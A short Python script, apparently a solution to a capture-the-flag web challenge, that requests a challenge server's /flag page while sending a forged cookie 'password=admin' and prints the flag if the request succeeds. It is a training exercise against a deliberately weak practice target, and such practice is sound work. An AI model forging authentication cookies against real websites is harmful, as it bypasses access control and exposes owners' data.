import requests

cookies = dict(password='admin')
r = requests.get("http://web-05.challs.olicyber.it/flag", cookies=cookies)
if r.status_code == 200:
    print(r.text)
